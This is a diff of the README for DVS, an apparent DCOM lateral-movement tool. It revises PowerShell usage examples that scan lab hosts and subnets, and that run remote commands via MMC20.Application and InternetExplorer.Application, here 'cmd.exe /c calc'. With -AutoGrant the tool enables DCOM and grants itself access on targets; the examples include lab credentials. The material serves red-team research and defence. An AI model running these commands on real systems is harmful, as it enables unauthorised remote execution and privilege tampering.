@@ -138,58 +138,60 @@ The DVS tool first checks if principal-identity has access to the remote machine
 
 Invoke-DCOMObjectScan function allows you to scan DCOM objects and find vulnerable functions via a list of patterns or exact function names that you included in a file.
 * Examples:
-  1. Check whether the "MMC20.Application" (ProgID) object is accessible from the attacker machine to the "DC01" host without first querying and verifying the access list of the DCOM object.
-     *Note:* -NoAuth is not eligible on type "All" due to the fact that it needs to interact with the registry of the remote machine.
+  1. Enumerates and Scan `MMC20.Application` (ProgID) object from the attacker machine to the `DC01` host without querying the registry.
 
-            PS> Invoke-DCOMObjectScan -Type Single -ObjectName "MMC20.Application" -HostList DC01 -NoAuth -CheckAccessOnly -Verbose
+            Invoke-DCOMObjectScan -Type Single -ObjectName "MMC20.Application" -HostList DC01 -SkipRegAuth -Username "lab\administrator" -Password "Aa123456!" -Verbose
 
-  2. Validates whether the "MMC20.Application" (ProgID) is applicable through 10.211.55.4/24 ip addresses range. If exists, he tool will try to enumerate the information about it. (using the current logged-on user session).
+    **Note:** The tool will not analyze ACL permissions, and when the tool will success, it will resolve all the information about the object, except the details mentioned on the registry(Like object name, executable file, etc.)
+
+  2. Check whether the `MMC20.Application` (ProgID) object is accessible from the attacker machine to the `DC01` host without first querying and verifying the access list of the DCOM object.
+
+            PS> Invoke-DCOMObjectScan -Type Single -ObjectName "MMC20.Application" -HostList DC01 -SkipPermissionChecks -CheckAccessOnly -Verbose
+
+  3. Validates whether the `MMC20.Application` (ProgID) is applicable through `10.211.55.4/24` ip addresses range. If exists, he tool will try to enumerate the information about it. (using the current logged-on user session).
 
             PS> Invoke-DCOMObjectScan -Type Single -ObjectName "MMC20.Application" -Hostlist "10.211.55.4/24" -CheckAccessOnly -Verbose
 
-  3. Validates if the "{00020812-0000-0000-C000-000000000046}" CLSID object exists and accessible. If exists, the tool will enumerate the information about it. (By using lab\administrator credentials).
+  4. Validates if the `{00020812-0000-0000-C000-000000000046}` CLSID through `10.211.55.4` ip address object exists and accessible. If exists, the tool will resolve the information about it. (By using `lab\administrator` credentials).
 
-            PS> Invoke-DCOMObjectScan -Type Single -ObjectName "{00020812-0000-0000-C000-000000000046}" -HostList "10.211.55.4" -CheckAccessOnly -Username "lab\administrator" -Password "Aa123456!" -Verbose
+            PS> Invoke-DCOMObjectScan -Type Single -ObjectName "{00020812-0000-0000-C000-000000000046}" -Hostlist "10.211.55.4" -CheckAccessOnly -Username "lab\administrator" -Password "Aa123456!" -Verbose   
 
-  4. Scans all the objects stored on a specified path (e.g. "C:\Users\USERNAME\Desktop\DVS\objects.txt") and finds the function list located in the specified file like "vulnerable.txt" using the "lab\administrator" credentials with the _following configuration_:  
-     *Max depth:* 4  
-     *Max results:* 1 result for each object.  
-     *AutoGrant mode:* If we don't have access to the object or if the DCOM feature is disabled, enable the DCOM feature and perform automatic grant to the relevant DCOM object.  
-     Finally, revert the machine to the same state as before the attack.
+  5. Scans all the objects stored on a specified path (e.g. `C:\Users\USERNAME\Desktop\DVS\objects.txt`) through `10.211.55.4` ip address, and finds the function list located in the specified file like `vulnerable.txt` using the `lab\administrator` credentials with the _following configuration_:  
+        *Max depth:* 4  
+        *Max results:* 1 (1 result for each object)  
+        *AutoGrant mode:* If we don't have access to the object or if the DCOM feature is disabled, enable the DCOM feature and perform automatic grant to the relevant DCOM object.  
+        Finally, revert the machine to the same state as before the attack.
 
-            PS> Invoke-DCOMObjectScan -MaxDepth 4 -Type List -ObjectListFile "C:\Users\USERNAME\Desktop\DVS\objects.txt"  -FunctionListFile "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt" -AutoGrant -Username "lab\administrator" -Password "Aa123456!" -HostList "10.211.55.4" -MaxResults 1 -Verbose
+            PS> Invoke-DCOMObjectScan -MaxDepth 4 -Type List -ObjectListFile "C:\Users\USERNAME\Desktop\DVS\objects.txt" -FunctionListFile "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt" -AutoGrant -Username "lab\administrator" -Password "Aa123456!" -Hostlist "10.211.55.4" -MaxResults 1 -Verbose
 
-  5. Scans all the objects stored on the remote machine and finds the functions located on the selected file (e.g. "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt").  
-     *Force mode:* This mode will attempt to access a DCOM object even if the tool assumes that the principal-identity doesn't have access to it.  
-     This flag is created to solve the edge-case in which the tool can't resolve the groups the current logged-on/provided user is a member of.  
-     For example: When an endpoint is used which is not domain joined and the tool can't resolve group which the user is a member of, then, the tool will assume that the user is only a member of "Everyone" group.
+  6. Scans all the objects stored on the available remote machines from the `10.211.55.1/24` range and finds potential vulnerable functions from the list located on the selected file (e.g. `C:\Users\USERNAME\Desktop\DVS\vulnerable.txt`).
 
-            PS> Invoke-DCOMObjectScan -MaxDepth 4 -Type All  -FunctionListFile "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt" -HostList "10.211.55.4" -Force -Verbose
+            PS> Invoke-DCOMObjectScan -MaxDepth 4 -Type All  -FunctionListFile "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt" -Hostlist "10.211.55.1/24" -Verbose
 
 
 #### Get-ExecutionCommand
 
 Get-ExecutionCommand function allows to generate a PowerShell payload that will interact and execute with the remote DCOM function with the relevant parameters.
 * Examples:
-  1. Checks if the principal-identity is granted to interact with "{00020812-0000-0000-C000-000000000046}" CLSID object using lab\administrator credentials, then it will generates the execution command.
+  1. Checks if the principal-identity is granted to interact with `{00020812-0000-0000-C000-000000000046}` CLSID object through `10.211.55.4` ip address using `lab\administrator` credentials, then it will generates the execution command.
 
             PS> Get-ExecutionCommand -ObjectName "{00020812-0000-0000-C000-000000000046}" -ObjectPath "DDEInitiate" -HostList "10.211.55.4" -Username "lab\Administrator" -Password "Aa123456!" -Verbose
 
 
   2. Checks for DCOM access,  
-     In case the principal-identity doesn't have the necessary permissions or the DCOM feature is disabled, the tool will enable the DCOM feature, grants identity access and interacts with "MMC20.Application" ProgID object using lab\administrator credentials, and will generates you the execution command.
-     Finally, it will revert the machine to the same state as before the attack.
+        In case the principal-identity doesn't have the necessary permissions or the DCOM feature is disabled, the tool will enable the DCOM feature, grants identity access and interacts with `MMC20.Application` (ProgID) object through `10.211.55.4` ip address using `lab\administrator` credentials, and will generates you the execution command.  
+        Finally, it will revert the machine to the same state as before the attack.
 
             PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.4" -Username "lab\Administrator" -Password "Aa123456!" -AutoGrant -Verbose
 
-  3. Tries to interact with "MMC20.Application" ProgID object using current logged-on session (Even the tool assumes that the user doesn't have access to the object),
-     then it will generates the execution command.
+  3. Tries to interact with `MMC20.Application` (ProgID) object through `10.211.55.1/24` ip range using current logged-on session without analyze ACL permissions
+        then it will generates the execution command.
 
-            PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.4" -Force -Verbose
+            PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.1/24" -SkipPermissionChecks -Verbose
 
-  4. Tries to interact with "MMC20.Application" ProgID object without checking principal-identity privileges
+  4. Tries to interact with `MMC20.Application` (ProgID) object through `10.211.55.4` ip address, without querying the registry.
 
-            PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.4" -NoAuth -Verbose
+            PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.4" -SkipRegAuth -Verbose
 
 
 #### Invoke-ExecutionCommand
@@ -198,39 +200,39 @@ Invoke-ExecutionCommand function executes commands via DCOM Object using the log
 * Examples:
 
   1. Checks for DCOM access,  
-    In case the principal-identity doesn't have the necessary permissions or the DCOM feature is disabled, the tool will enable the DCOM feature, grant access, Interact with MMC20.Application object using current logged-on user session and Execute the following commands:
-     1. "cmd.exe /c calc"
-     2. Frame.Top attribute to "1"
-    Finally, revert the machine to the same state as before the attack.
+        In case the principal-identity doesn't have the necessary permissions or the DCOM feature is disabled, the tool will enable the DCOM feature, grant access, Interact with `MMC20.Application` (ProgID) object through the IP range: `10.211.55.1/24` using current logged-on user session and Execute the following commands:
+        1. Executes `cmd.exe /c calc` command
+        2. Set `Frame.Top` attribute to `1`
+        Finally, revert the machine to the same state as before the attack.
 
-            PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -AutoGrant -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")},@{ObjectPath="Frame.Top";Arguments=@(1)} ) -Verbose -HostList 10.211.55.4
+                PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -AutoGrant -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")},@{ObjectPath="Frame.Top";Arguments=@(1)} ) -HostList "10.211.55.1/24" -Verbose
 
-  2. Tries to interact with MMC20.Application object using lab\administrator credentials, and executes the following command: "cmd.exe /c calc".
+  2. Tries to interact with `MMC20.Application` (ProgID) object using `lab\administrator` credentials through `10.211.55.4` ip address, and executes the following command: `cmd.exe /c calc`.
 
-            PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")}) -Verbose -HostList 10.211.55.4 -Username lab\administrator -Password Aa123456!
+            PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")}) -HostList "10.211.55.4" -Username "lab\administrator" -Password "Aa123456!" -Verbose
 
-  3. Tries to interact with MMC20.Application object using current logged-on user session (Even the tool assumes that the user doesn't have an access to the object), and executes the following command: "cmd.exe /c calc".
+  3. Tries to interact with `MMC20.Application` (ProgID) object using current logged-on user session without analyze ACL permissions, and executes the following command: `cmd.exe /c calc`.
 
-            PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")}) -Verbose -HostList 10.211.55.4 -Force
+            PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")}) -HostList "10.211.55.4" -SkipPermissionChecks -Verbose
 
 #### Invoke-RegisterRemoteSchema
 
-Invoke-RegisterRemoteSchema function executes commands via one of the following objects object using the logged-on user or provided credentials:
+Invoke-RegisterRemoteSchema function executes commands via InternetExplorer.Application's object using the logged-on user or provided credentials.
 * ShellBrowserWindow
 * ShellWindows
 * Internet Explorer
 * ielowutil.exe
 
-**Note:** These objects doesn't need access to local machine hive, it will proceed with the foothold with any user that can access the remote machine!
+**Note:** This object doesn't need any access to local machine hive, it will proceed with the foothold with any user that can access the remote machine!
 
 * Examples:
-  1. Executes "cmd /c calc" command on 10.211.55.1/24 remote machine using the current logged-on session, and grant privileges if is needed
+  1. Executes `cmd /c calc` command on `10.211.55.1/24` ip range using the current logged-on session, and grant privileges if is needed
 
-            PS> Invoke-RegisterRemoteSchema -HostList 10.211.55.1/24 -Command "cmd /c calc"
+            PS> Invoke-RegisterRemoteSchema -HostList "10.211.55.1/24" -Command "cmd /c calc" -AutoGrant -Verbose
 
-  2. Executes "cmd /c calc" command on 10.211.55.4 remote machine using the current logged-on session using provided credentials
+  2. Executes `cmd /c calc` command on 10.211.55.4 remote machine using provided credentials
 
-            PS> Invoke-RegisterRemoteSchema -HostList 10.211.55.4 -Command "cmd /c calc" -Username Administrator -Password Aa123456!
+            PS> Invoke-RegisterRemoteSchema -HostList "10.211.55.4" -Command "cmd /c calc" -Username "Administrator" -Password "Aa123456!" -Verbose
 
 ## Future work
 * Analyze and change firewall rules remotely
